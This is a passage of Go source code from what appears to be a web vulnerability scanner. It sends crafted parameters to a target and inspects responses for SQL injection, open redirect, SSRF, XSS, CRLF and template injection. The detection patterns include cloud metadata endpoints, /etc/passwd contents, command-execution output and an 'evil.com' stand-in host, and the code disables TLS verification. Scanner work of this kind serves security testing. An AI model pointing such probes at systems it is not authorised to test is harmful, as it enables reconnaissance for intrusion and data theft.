				fmt.Printf("[!!!] Reflected VBA Macro Injection found!\n")
				fmt.Printf("     URL: %s\n", testURL)
				fmt.Printf("     Parameter: %s\n", param)
				fmt.Printf("     Payload: %s\n\n", payload)
			}
			
			break
		}
	}
	
	// Update stats
	mutex.Lock()
	scanResult.Stats["requests"] = scanResult.Stats["requests"] + 1
	mutex.Unlock()
}

func constructURL(baseURL, param, payload string) string {
	// Check if URL already has parameters
	if strings.Contains(baseURL, "?") {
		return fmt.Sprintf("%s&%s=%s", baseURL, url.QueryEscape(param), url.QueryEscape(payload))
	}
	return fmt.Sprintf("%s?%s=%s", baseURL, url.QueryEscape(param), url.QueryEscape(payload))
}

func sendRequest(method, url, body string) (*http.Response, error) {
	req, err := http.NewRequest(method, url, strings.NewReader(body))
	if err != nil {
		return nil, err
	}
	
	// Add common headers
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "keep-alive")
	
	if method == "POST" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	
	// Send request
	return client.Do(req)
}

func printSummary(startTime time.Time) {
	// ANSI color codes
	blue := "\033[34m"
	cyan := "\033[36m"
	green := "\033[32m"
	yellow := "\033[33m"
	red := "\033[31m"
	magenta := "\033[35m"
	bold := "\033[1m"
	reset := "\033[0m"
	
	// Calculate duration
	endTime := time.Now()
	duration := endTime.Sub(startTime)
	
	// Update scan result
	scanResult.EndTime = endTime.Format(time.RFC3339)
	scanResult.Duration = duration.String()
	
	// Print divider
	fmt.Printf("\n%s%s%s\n", blue, strings.Repeat("-", 60), reset)
	
	// Print summary header
	fmt.Printf("%s%s[ SCAN SUMMARY ]%s\n\n", bold, yellow, reset)
	
	// Print summary details
	fmt.Printf("%s➤%s 👾Target        : %s%s%s\n", yellow, reset, cyan, scanResult.Target, reset)
	fmt.Printf("%s➤%s 🕰Duration      : %s%s%s\n", yellow, reset, cyan, duration.Round(time.Millisecond).String(), reset)
	fmt.Printf("%s➤%s 📊Requests      : %s%d%s\n", yellow, reset, cyan, scanResult.Stats["requests"], reset)
	// Choose color based on whether vulnerabilities were found
	vulnColor := green
	if len(scanResult.Vulnerabilities) > 0 {
		vulnColor = red
	}
	fmt.Printf("%s➤%s 🛡️Vulnerabilities: %s%d%s\n", yellow, reset, vulnColor, len(scanResult.Vulnerabilities), reset)
	
	// Print divider
	fmt.Printf("%s%s%s\n", blue, strings.Repeat("-", 60), reset)
	
	// Print vulnerabilities if found
	if len(scanResult.Vulnerabilities) > 0 {
		// Print vulnerability header
		fmt.Printf("\n%s%s[ VULNERABILITIES FOUND ]%s\n\n", bold, red, reset)
		
		// Group vulnerabilities by type
		vulnsByType := make(map[string][]VBAVulnerability)
		for _, vuln := range scanResult.Vulnerabilities {
			vulnsByType[vuln.Type] = append(vulnsByType[vuln.Type], vuln)
		}
		
		// Print vulnerabilities by type
		for vulnType, vulns := range vulnsByType {
			// Print vulnerability type header
			fmt.Printf("%s%s[%s] %s (%d)%s\n", bold, blue, yellow, vulnType, len(vulns), reset)
			
			// Print each vulnerability of this type
			for i, vuln := range vulns {
				// Determine severity color
				severityColor := green
				if vuln.Severity == "High" {
					severityColor = red
				} else if vuln.Severity == "Medium" {
					severityColor = yellow
				}
				
				// Print vulnerability details
				fmt.Printf("  %s%d.%s %s\n", cyan, i+1, reset, vuln.URL)
				fmt.Printf("     %sParam%s: %s\n", magenta, reset, vuln.Parameter)
				fmt.Printf("     %sEvidence%s: %s\n", magenta, reset, vuln.Evidence)
				fmt.Printf("     %sSeverity%s: %s%s%s\n", magenta, reset, severityColor, vuln.Severity, reset)
				fmt.Printf("     %sConfidence%s: %s%s%s\n\n", magenta, reset, cyan, vuln.Confidence, reset)
			}
		}
		
		// Print recommendations
		fmt.Printf("%s%s[ RECOMMENDATIONS ]%s\n\n", bold, green, reset)
		fmt.Printf("%s➤%s Review and fix the identified vulnerabilities\n", yellow, reset)
		fmt.Printf("%s➤%s Implement proper input validation and sanitization\n", yellow, reset)
		fmt.Printf("%s➤%s Consider using a Web Application Firewall (WAF)\n", yellow, reset)
	} else {
		// Print no vulnerabilities message
		fmt.Printf("\n%s%s[ NO VULNERABILITIES FOUND ]%s\n\n", bold, green, reset)
		fmt.Printf("%s➤%s No vulnerabilities were detected in the target application.%s\n", yellow, reset, green)
		fmt.Printf("%s➤%s Continue to monitor and test regularly for security issues.%s\n", yellow, reset, green)
	}
	
	// Print footer
	fmt.Printf("\n%s%s%s\n", blue, strings.Repeat("-", 60), reset)
	fmt.Printf("%sScan completed at: %s%s\n", cyan, time.Now().Format("2006-01-02 15:04:05"), reset)
}

func testSQLInjection(param, payload string) {
	// Construct test URL
	testURL := constructURL(targetURL, param, payload)

	
	if verbose {
		fmt.Printf("[*] Testing parameter '%s' for SQL injection with payload: %s\n", param, payload)
	}
	
	// Send GET request
	resp, err := sendRequest("GET", testURL, "")
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error testing %s: %s\n", testURL, err)
		}
		return
	}
	
	// Read response body
	body, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error reading response from %s: %s\n", testURL, err)
		}
		return
	}
	
	// Check for SQL error patterns in response
	bodyStr := string(body)
	for _, pattern := range sqlErrorPatterns {
		if strings.Contains(bodyStr, pattern) {
			// SQL Injection vulnerability found
			mutex.Lock()
			vuln := VBAVulnerability{
				Type:       "SQL Injection",
				URL:        testURL,
				Parameter:  param,
				Evidence:   fmt.Sprintf("Found SQL error pattern: %s", pattern),
				Severity:   "High",
				Confidence: "Medium",
			}
			scanResult.Vulnerabilities = append(scanResult.Vulnerabilities, vuln)
			scanResult.Stats["vulnerabilities"] = len(scanResult.Vulnerabilities)
			mutex.Unlock()
			
			fmt.Printf("[!] SQL Injection vulnerability found!\n")
			fmt.Printf("    URL: %s\n", testURL)
			fmt.Printf("    Parameter: %s\n", param)
			fmt.Printf("    Error Pattern: %s\n", pattern)
			fmt.Printf("    Payload: %s\n\n", payload)
			break
		}
	}
	
	// Check for time-based SQL injection by measuring response time
	if strings.Contains(payload, "sleep") || strings.Contains(payload, "WAITFOR DELAY") || strings.Contains(payload, "pg_sleep") || strings.Contains(payload, "benchmark") {
		startTime := time.Now()
		
		// Send another request with the same payload to measure time
		timeResp, err := sendRequest("GET", testURL, "")
		if err != nil {
			return
		}
		
		// Read response body and close
		ioutil.ReadAll(timeResp.Body)
		timeResp.Body.Close()
		
		// Calculate response time
		respTime := time.Since(startTime)
		
		// If response time is greater than 5 seconds, it might be a time-based SQL injection
		if respTime.Seconds() > 5 {
			mutex.Lock()
			vuln := VBAVulnerability{
				Type:       "Time-Based SQL Injection",
				URL:        testURL,
				Parameter:  param,
				Evidence:   fmt.Sprintf("Response time: %.2f seconds", respTime.Seconds()),
				Severity:   "High",
				Confidence: "Medium",
			}
			scanResult.Vulnerabilities = append(scanResult.Vulnerabilities, vuln)
			scanResult.Stats["vulnerabilities"] = len(scanResult.Vulnerabilities)
			mutex.Unlock()
			
			fmt.Printf("[!] Time-Based SQL Injection vulnerability found!\n")
			fmt.Printf("    URL: %s\n", testURL)
			fmt.Printf("    Parameter: %s\n", param)
			fmt.Printf("    Response Time: %.2f seconds\n", respTime.Seconds())
			fmt.Printf("    Payload: %s\n\n", payload)
		}
	}
	
	// Check for boolean-based SQL injection by comparing responses
	if strings.Contains(payload, "OR 1=1") || strings.Contains(payload, "OR '1'='1") {
		// Send a request with a false condition
		falseURL := constructURL(targetURL, param, strings.Replace(payload, "1=1", "1=2", -1))
		falseURL = strings.Replace(falseURL, "'1'='1", "'1'='2'", -1)
		
		falseResp, err := sendRequest("GET", falseURL, "")
		if err != nil {
			return
		}
		
		// Read false response body
		falseBody, err := ioutil.ReadAll(falseResp.Body)
		falseResp.Body.Close()
		if err != nil {
			return
		}
		
		// Compare response lengths
		trueLen := len(body)
		falseLen := len(falseBody)
		
		// If there's a significant difference in response length, it might be a boolean-based SQL injection
		if math.Abs(float64(trueLen-falseLen)) > 100 {
			mutex.Lock()
			vuln := VBAVulnerability{
				Type:       "Boolean-Based SQL Injection",
				URL:        testURL,
				Parameter:  param,
				Evidence:   fmt.Sprintf("Response length difference: %d vs %d", trueLen, falseLen),
				Severity:   "High",
				Confidence: "Medium",
			}
			scanResult.Vulnerabilities = append(scanResult.Vulnerabilities, vuln)
			scanResult.Stats["vulnerabilities"] = len(scanResult.Vulnerabilities)
			mutex.Unlock()
			
			fmt.Printf("[!] Boolean-Based SQL Injection vulnerability found!\n")
			fmt.Printf("    URL: %s\n", testURL)
			fmt.Printf("    Parameter: %s\n", param)
			fmt.Printf("    Response Length Difference: %d vs %d\n", trueLen, falseLen)
			fmt.Printf("    Payload: %s\n\n", payload)
		}
	}
	
	// Update stats
	mutex.Lock()
	scanResult.Stats["requests"] = scanResult.Stats["requests"] + 1
	mutex.Unlock()
}

func testOpenRedirect(param, payload string) {
	// Construct test URL
	testURL := constructURL(targetURL, param, payload)
	
	if verbose {
		fmt.Printf("[*] Testing parameter '%s' for Open Redirect with payload: %s\n", param, payload)
	}
	
	// Send GET request with Redirect disabled to check for redirect responses
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	
	// Create a client that doesn't follow redirects
	noRedirectClient := &http.Client{
		Timeout: time.Duration(timeout) * time.Second,
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	
	// Create the request
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error creating request for %s: %s\n", testURL, err)
		}
		return
	}
	
	// Add common headers
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "keep-alive")
	
	// Send the request
	resp, err := noRedirectClient.Do(req)
	if err != nil {
		if !strings.Contains(err.Error(), "redirect") { // Ignore redirect errors
			if verbose {
				fmt.Printf("[!] Error testing %s: %s\n", testURL, err)
			}
			return
		}
	}
	
	if resp != nil {
		defer resp.Body.Close()
		
		// Check if we got a redirect response
		if resp.StatusCode >= 300 && resp.StatusCode < 400 {
			// Get the Location header
			location := resp.Header.Get("Location")
			
			// Check if the Location header contains our payload or evil.com
			if (strings.Contains(location, payload) || 
			    strings.Contains(location, "evil.com") || 
			    strings.Contains(location, "javascript:") || 
			    strings.Contains(location, "data:")) {
				
				// Open Redirect vulnerability found
				mutex.Lock()
				vuln := VBAVulnerability{
					Type:       "Open Redirect",
					URL:        testURL,
					Parameter:  param,
					Evidence:   fmt.Sprintf("Redirects to: %s", location),
					Severity:   "Medium",
					Confidence: "High",
				}
				scanResult.Vulnerabilities = append(scanResult.Vulnerabilities, vuln)
				scanResult.Stats["vulnerabilities"] = len(scanResult.Vulnerabilities)
				mutex.Unlock()
				
				fmt.Printf("[!] Open Redirect vulnerability found!\n")
				fmt.Printf("    URL: %s\n", testURL)
				fmt.Printf("    Parameter: %s\n", param)
				fmt.Printf("    Redirects to: %s\n", location)
				fmt.Printf("    Payload: %s\n\n", payload)
			}
		}
		
		// Also check the response body for potential JavaScript redirects
		body, err := ioutil.ReadAll(resp.Body)
		if err == nil {
			bodyStr := string(body)
			
			// Check for JavaScript redirects
			if (strings.Contains(bodyStr, "window.location") || 
			    strings.Contains(bodyStr, "location.href") || 
			    strings.Contains(bodyStr, "location.replace")) && 
			   (strings.Contains(bodyStr, payload) || 
			    strings.Contains(bodyStr, "evil.com")) {
				
				// JavaScript-based Open Redirect vulnerability found
				mutex.Lock()
				vuln := VBAVulnerability{
					Type:       "JavaScript Open Redirect",
					URL:        testURL,
					Parameter:  param,
					Evidence:   "JavaScript-based redirect detected",
					Severity:   "Medium",
					Confidence: "Medium",
				}
				scanResult.Vulnerabilities = append(scanResult.Vulnerabilities, vuln)
				scanResult.Stats["vulnerabilities"] = len(scanResult.Vulnerabilities)
				mutex.Unlock()
				
				fmt.Printf("[!] JavaScript Open Redirect vulnerability found!\n")
				fmt.Printf("    URL: %s\n", testURL)
				fmt.Printf("    Parameter: %s\n", param)
				fmt.Printf("    Payload: %s\n\n", payload)
			}
		}
	}
	
	// Update stats
	mutex.Lock()
	scanResult.Stats["requests"] = scanResult.Stats["requests"] + 1
	mutex.Unlock()
}

func testSSRF(param, payload string) {
	// Construct test URL
	testURL := constructURL(targetURL, param, payload)
	
	if verbose {
		fmt.Printf("[*] Testing parameter '%s' for SSRF with payload: %s\n", param, payload)
	}
	
	// Send GET request
	resp, err := sendRequest("GET", testURL, "")
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error testing %s: %s\n", testURL, err)
		}
		return
	}
	
	// Read response body
	body, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error reading response from %s: %s\n", testURL, err)
		}
		return
	}
	
	// Convert body to string for analysis
	bodyStr := string(body)
	
	// Check for indicators of successful SSRF
	ssrfDetected := false
	ssrfEvidence := ""
	
	// Check for common patterns that indicate successful SSRF
	if strings.Contains(payload, "localhost") || strings.Contains(payload, "127.0.0.1") || strings.Contains(payload, "[::1]") {
		// Check for localhost service responses
		if strings.Contains(bodyStr, "<title>SSH") || 
		   strings.Contains(bodyStr, "OpenSSH") || 
		   strings.Contains(bodyStr, "SSH-2.0") {
			ssrfDetected = true
			ssrfEvidence = "SSH service detected in response"
		} else if strings.Contains(bodyStr, "MySQL") || 
		          strings.Contains(bodyStr, "<title>phpMyAdmin</title>") || 
		          strings.Contains(bodyStr, "mysql_native_password") {
			ssrfDetected = true
			ssrfEvidence = "MySQL service detected in response"
		} else if strings.Contains(bodyStr, "Redis") || 
		          strings.Contains(bodyStr, "redis_version") {
			ssrfDetected = true
			ssrfEvidence = "Redis service detected in response"
		} else if strings.Contains(bodyStr, "MongoDB") || 
		          strings.Contains(bodyStr, "mongo_version") {
			ssrfDetected = true
			ssrfEvidence = "MongoDB service detected in response"
		}
	}
	
	// Check for cloud metadata responses
	if strings.Contains(payload, "169.254.169.254") || strings.Contains(payload, "metadata") {
		if strings.Contains(bodyStr, "ami-id") || 
		   strings.Contains(bodyStr, "instance-id") || 
		   strings.Contains(bodyStr, "iam") || 
		   strings.Contains(bodyStr, "security-credentials") {
			ssrfDetected = true
			ssrfEvidence = "AWS metadata service detected in response"
		} else if strings.Contains(bodyStr, "compute.metadata") || 
		          strings.Contains(bodyStr, "computeMetadata") || 
		          strings.Contains(bodyStr, "instance/service-accounts") {
			ssrfDetected = true
			ssrfEvidence = "GCP metadata service detected in response"
		} else if strings.Contains(bodyStr, "digitalocean") || 
		          strings.Contains(bodyStr, "droplet") {
			ssrfDetected = true
			ssrfEvidence = "DigitalOcean metadata service detected in response"
		}
	}
	
	// Check for file protocol responses
	if strings.Contains(payload, "file:") {
		if strings.Contains(bodyStr, "root:") || 
		   strings.Contains(bodyStr, "nobody:") || 
		   strings.Contains(bodyStr, "/bin/bash") || 
		   strings.Contains(bodyStr, "/usr/sbin") {
			ssrfDetected = true
			ssrfEvidence = "Local file contents detected in response (possibly /etc/passwd)"
		} else if strings.Contains(bodyStr, "BOOT_IMAGE") || 
		          strings.Contains(bodyStr, "vmlinuz") {
			ssrfDetected = true
			ssrfEvidence = "System file contents detected in response"
		}
	}
	
	// Check for unusual status codes that might indicate SSRF
	if resp.StatusCode != 200 && resp.StatusCode != 404 && resp.StatusCode != 403 {
		// Non-standard status codes might indicate partial SSRF
		if resp.StatusCode == 500 || resp.StatusCode == 502 || resp.StatusCode == 504 {
			// Server errors might indicate successful connection to internal service
			if len(bodyStr) > 0 && (strings.Contains(bodyStr, "error") || strings.Contains(bodyStr, "exception") || strings.Contains(bodyStr, "timeout")) {
				ssrfDetected = true
				ssrfEvidence = fmt.Sprintf("Server error (%d) when connecting to internal service", resp.StatusCode)
			}
		}
	}
	
	// If SSRF is detected, report it
	if ssrfDetected {
		mutex.Lock()
		vuln := VBAVulnerability{
			Type:       "Server-Side Request Forgery (SSRF)",
			URL:        testURL,
			Parameter:  param,
			Evidence:   ssrfEvidence,
			Severity:   "High",
			Confidence: "Medium",
		}
		scanResult.Vulnerabilities = append(scanResult.Vulnerabilities, vuln)
		scanResult.Stats["vulnerabilities"] = len(scanResult.Vulnerabilities)
		mutex.Unlock()
		
		fmt.Printf("[!] Server-Side Request Forgery (SSRF) vulnerability found!\n")
		fmt.Printf("    URL: %s\n", testURL)
		fmt.Printf("    Parameter: %s\n", param)
		fmt.Printf("    Evidence: %s\n", ssrfEvidence)
		fmt.Printf("    Payload: %s\n\n", payload)
	}
	
	// Update stats
	mutex.Lock()
	scanResult.Stats["requests"] = scanResult.Stats["requests"] + 1
	mutex.Unlock()
}

func testXSS(param, payload string) {
	// Construct test URL
	testURL := constructURL(targetURL, param, payload)
	
	if verbose {
		fmt.Printf("[*] Testing parameter '%s' for XSS with payload: %s\n", param, payload)
	}
	
	// Try to catch any panics that might occur during testing
	defer func() {
		if r := recover(); r != nil {
			if verbose {
				fmt.Printf("[!] Panic recovered in XSS testing: %v\n", r)
			}
		}
	}()
	
	// Send GET request
	resp, err := sendRequest("GET", testURL, "")
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error testing %s: %s\n", testURL, err)
		}
		return
	}
	
	// Read response body
	body, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error reading response from %s: %s\n", testURL, err)
		}
		return
	}
	
	// Convert body to string for analysis
	bodyStr := string(body)
	
	// Check if the payload is reflected in the response
	if strings.Contains(bodyStr, payload) {
		// Determine XSS type and severity
		xssType := "Reflected XSS"
		severity := "High"
		confidence := "Medium"
		
		// Check for DOM-based XSS indicators
		if strings.Contains(bodyStr, "document.write") || 
		   strings.Contains(bodyStr, "innerHTML") || 
		   strings.Contains(bodyStr, "outerHTML") || 
		   strings.Contains(bodyStr, "document.location") || 
		   strings.Contains(bodyStr, "location.href") || 
		   strings.Contains(bodyStr, "window.location") {
			xssType = "DOM-based XSS"
			severity = "High"
			confidence = "Medium"
		}
		
		// Check if the payload is in a script context
		if strings.Contains(bodyStr, "<script") && strings.Contains(bodyStr, payload) {
			xssType = "Stored XSS (Script Context)"
			severity = "Critical"
			confidence = "High"
		}
		
		// Check for WAF bypass indicators
		if strings.Contains(payload, "javascript:") || 
		   strings.Contains(payload, "data:") || 
		   strings.Contains(payload, "\\x") || 
		   strings.Contains(payload, "&#") {
			xssType = "XSS (WAF Bypass)"
			severity = "Critical"
			confidence = "High"
		}
		
		// Check for CSP bypass indicators
		if resp.Header.Get("Content-Security-Policy") != "" {
			xssType = "XSS (Potential CSP Bypass)"
			severity = "Critical"
			confidence = "Medium"
		}
		
		// Report the vulnerability
		mutex.Lock()
		vuln := VBAVulnerability{
			Type:       xssType,
			URL:        testURL,
			Parameter:  param,
			Evidence:   fmt.Sprintf("Payload reflected: %s", payload),
			Severity:   severity,
			Confidence: confidence,
		}
		scanResult.Vulnerabilities = append(scanResult.Vulnerabilities, vuln)
		scanResult.Stats["vulnerabilities"] = len(scanResult.Vulnerabilities)
		mutex.Unlock()
		
		fmt.Printf("[!] %s vulnerability found!\n", xssType)
		fmt.Printf("    URL: %s\n", testURL)
		fmt.Printf("    Parameter: %s\n", param)
		fmt.Printf("    Payload: %s\n", payload)
		fmt.Printf("    Severity: %s\n", severity)
		fmt.Printf("    Confidence: %s\n\n", confidence)
	}
	
	// Update stats
	mutex.Lock()
	scanResult.Stats["requests"] = scanResult.Stats["requests"] + 1
	mutex.Unlock()
}

func testCRLF(param, payload string) {
	// Construct test URL
	testURL := constructURL(targetURL, param, payload)
	
	if verbose {
		fmt.Printf("[*] Testing parameter '%s' for CRLF Injection with payload: %s\n", param, payload)
	}
	
	// Try to catch any panics that might occur during testing
	defer func() {
		if r := recover(); r != nil {
			if verbose {
				fmt.Printf("[!] Panic recovered in CRLF testing: %v\n", r)
			}
		}
	}()
	
	// Create a custom HTTP client that doesn't follow redirects
	client := &http.Client{
		Timeout:   time.Duration(timeout) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	
	// Create a new request
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error creating request for %s: %s\n", testURL, err)
		}
		return
	}
	
	// Add custom headers to make the request more realistic
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "close")
	
	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error testing %s: %s\n", testURL, err)
		}
		return
	}
	
	// Read response body
	body, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error reading response from %s: %s\n", testURL, err)
		}
		return
	}
	
	// Convert body to string for analysis
	bodyStr := string(body)
	
	// Check for successful CRLF injection
	crlfDetected := false
	crlfEvidence := ""
	severity := "Medium"
	confidence := "Medium"
	
	// Check for injected headers
	if strings.Contains(payload, "Set-Cookie") {
		for _, cookie := range resp.Cookies() {
			if cookie.Name == "crlf" || strings.Contains(cookie.Value, "injection") {
				crlfDetected = true
				crlfEvidence = fmt.Sprintf("Injected cookie found: %s=%s", cookie.Name, cookie.Value)
				severity = "High"
				confidence = "High"
				break
			}
		}
	}
	
	// Check for location header injection
	if strings.Contains(payload, "Location") {
		location := resp.Header.Get("Location")
		if strings.Contains(location, "evil.com") {
			crlfDetected = true
			crlfEvidence = fmt.Sprintf("Injected Location header found: %s", location)
			severity = "High"
			confidence = "High"
		}
	}
	
	// Check for Content-Type header injection
	if strings.Contains(payload, "Content-Type") {
		contentType := resp.Header.Get("Content-Type")
		if strings.Contains(contentType, "text/html") && strings.Contains(payload, "text/html") {
			crlfDetected = true
			crlfEvidence = fmt.Sprintf("Injected Content-Type header found: %s", contentType)
			severity = "Medium"
			confidence = "Medium"
		}
	}
	
	// Check for X-XSS-Protection header injection
	if strings.Contains(payload, "X-XSS-Protection") {
		xssProtection := resp.Header.Get("X-XSS-Protection")
		if xssProtection == "0" {
			crlfDetected = true
			crlfEvidence = "Injected X-XSS-Protection: 0 header found"
			severity = "High"
			confidence = "High"
		}
	}
	
	// Check for CSP header injection
	if strings.Contains(payload, "Content-Security-Policy") {
		csp := resp.Header.Get("Content-Security-Policy")
		if strings.Contains(csp, "unsafe-inline") {
			crlfDetected = true
			crlfEvidence = fmt.Sprintf("Injected CSP header found: %s", csp)
			severity = "Critical"
			confidence = "High"
		}
	}
	
	// Check for HTTP response splitting (body injection)
	if strings.Contains(payload, "%0D%0A%0D%0A") {
		if strings.Contains(bodyStr, "<script>") || strings.Contains(bodyStr, "<img") || strings.Contains(bodyStr, "<svg") {
			crlfDetected = true
			crlfEvidence = "HTTP response splitting detected with HTML/script injection"
			severity = "Critical"
			confidence = "High"
		}
	}
	
	// Check for basic CRLF injection by looking at response status
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		// If we detect any unusual headers that might have been injected
		for header, values := range resp.Header {
			for _, value := range values {
				if strings.Contains(value, "injection") || strings.Contains(value, "evil.com") {
					crlfDetected = true
					crlfEvidence = fmt.Sprintf("Suspicious header found: %s: %s", header, value)
					severity = "Medium"
					confidence = "Medium"
				}
			}
		}
	}
	
	// If CRLF injection is detected, report it
	if crlfDetected {
		mutex.Lock()
		vuln := VBAVulnerability{
			Type:       "CRLF Injection",
			URL:        testURL,
			Parameter:  param,
			Evidence:   crlfEvidence,
			Severity:   severity,
			Confidence: confidence,
		}
		scanResult.Vulnerabilities = append(scanResult.Vulnerabilities, vuln)
		scanResult.Stats["vulnerabilities"] = len(scanResult.Vulnerabilities)
		mutex.Unlock()
		
		fmt.Printf("[!] CRLF Injection vulnerability found!\n")
		fmt.Printf("    URL: %s\n", testURL)
		fmt.Printf("    Parameter: %s\n", param)
		fmt.Printf("    Payload: %s\n", payload)
		fmt.Printf("    Evidence: %s\n", crlfEvidence)
		fmt.Printf("    Severity: %s\n", severity)
		fmt.Printf("    Confidence: %s\n\n", confidence)
	}
	
	// Update stats
	mutex.Lock()
	scanResult.Stats["requests"] = scanResult.Stats["requests"] + 1
	mutex.Unlock()
}

func testSSTI(param, payload string) {
	// Construct test URL
	testURL := constructURL(targetURL, param, payload)
	
	if verbose {
		fmt.Printf("[*] Testing parameter '%s' for SSTI with payload: %s\n", param, payload)
	}
	
	// Try to catch any panics that might occur during testing
	defer func() {
		if r := recover(); r != nil {
			if verbose {
				fmt.Printf("[!] Panic recovered in SSTI testing: %v\n", r)
			}
		}
	}()
	
	// Send GET request
	resp, err := sendRequest("GET", testURL, "")
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error testing %s: %s\n", testURL, err)
		}
		return
	}
	
	// Read response body
	body, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error reading response from %s: %s\n", testURL, err)
		}
		return
	}
	
	// Convert body to string for analysis
	bodyStr := string(body)
	
	// Check for successful SSTI
	stiDetected := false
	stiEvidence := ""
	severity := "High"
	confidence := "Medium"
	
	// Check for mathematical expressions
	if strings.Contains(payload, "7*7") && strings.Contains(bodyStr, "49") {
		stiDetected = true
		stiEvidence = "Mathematical expression evaluated: 7*7=49"
		severity = "High"
		confidence = "High"
	}
	
	// Check for string multiplication (Python-specific)
	if strings.Contains(payload, "7*'7'") && strings.Contains(bodyStr, "7777777") {
		stiDetected = true
		stiEvidence = "String multiplication detected: 7*'7'=7777777"
		severity = "High"
		confidence = "High"
	}
	
	// Check for object/config exposure
	if (strings.Contains(payload, "config") || 
	    strings.Contains(payload, "self") || 
	    strings.Contains(payload, "request")) && 
	   (strings.Contains(bodyStr, "SECRET") || 
	    strings.Contains(bodyStr, "PASSWORD") || 
	    strings.Contains(bodyStr, "API_KEY") || 
	    strings.Contains(bodyStr, "__dict__") || 
	    strings.Contains(bodyStr, "environ") || 
	    strings.Contains(bodyStr, "application")) {
		stiDetected = true
		stiEvidence = "Configuration/object exposure detected"
		severity = "Critical"
		confidence = "High"
	}
	
	// Check for command execution indicators
	if (strings.Contains(bodyStr, "uid=") || 
	    strings.Contains(bodyStr, "gid=") || 
	    strings.Contains(bodyStr, "groups=") || 
	    strings.Contains(bodyStr, "/bin/") || 
	    strings.Contains(bodyStr, "root:") || 
	    strings.Contains(bodyStr, "PATH=") || 
	    strings.Contains(bodyStr, "HOME=") || 
	    strings.Contains(bodyStr, "USER=")) {
		stiDetected = true
		stiEvidence = "Command execution detected"
		severity = "Critical"
		confidence = "High"
	}
	
	// Check for subclass/introspection exposure
	if strings.Contains(payload, "__class__") && 
	   (strings.Contains(bodyStr, "<class") || 
	    strings.Contains(bodyStr, "subclasses") || 
	    strings.Contains(bodyStr, "__mro__")) {
		stiDetected = true
		stiEvidence = "Class introspection detected"
		severity = "Critical"
		confidence = "High"
	}
	
	// Check for template engine specific indicators
	if strings.Contains(payload, "freemarker") && strings.Contains(bodyStr, "Execute") {
		stiDetected = true
		stiEvidence = "Freemarker template engine detected and potentially exploited"
		severity = "Critical"
		confidence = "High"
	}
	
	// Check for PHP specific indicators
	if strings.Contains(payload, "{php}") && 
	   (strings.Contains(bodyStr, "system") || 
	    strings.Contains(bodyStr, "passthru") || 
	    strings.Contains(bodyStr, "exec")) {
		stiDetected = true
		stiEvidence = "PHP code execution detected"
		severity = "Critical"
		confidence = "High"
	}
	
	// Check for Java specific indicators
	if strings.Contains(payload, "java.lang.Runtime") && 
	   (strings.Contains(bodyStr, "getRuntime") || 
	    strings.Contains(bodyStr, "exec")) {
		stiDetected = true
		stiEvidence = "Java Runtime execution detected"
		severity = "Critical"
		confidence = "High"
	}
	
	// Check for Ruby ERB specific indicators
	if strings.Contains(payload, "<%=") && 
	   (strings.Contains(bodyStr, "system") || 
	    strings.Contains(bodyStr, "IO.popen") || 
	    strings.Contains(bodyStr, "Open3")) {
		stiDetected = true
		stiEvidence = "Ruby ERB template injection detected"
		severity = "Critical"
		confidence = "High"
	}
	
	// Check for Node.js specific indicators
	if strings.Contains(payload, "constructor") && 
	   (strings.Contains(bodyStr, "process") || 
	    strings.Contains(bodyStr, "require") || 
	    strings.Contains(bodyStr, "child_process") || 
	    strings.Contains(bodyStr, "execSync")) {
		stiDetected = true
		stiEvidence = "Node.js code execution detected"
		severity = "Critical"
		confidence = "High"
	}
	
	// Check for Django specific indicators
	if strings.Contains(payload, "{%") && 
	   (strings.Contains(bodyStr, "debug") || 
	    strings.Contains(bodyStr, "load") || 
	    strings.Contains(bodyStr, "include") || 
	    strings.Contains(bodyStr, "extends")) {
		stiDetected = true
		stiEvidence = "Django template injection detected"
		severity = "High"
		confidence = "Medium"
	}
	
	// If SSTI is detected, report it
	if stiDetected {
		mutex.Lock()
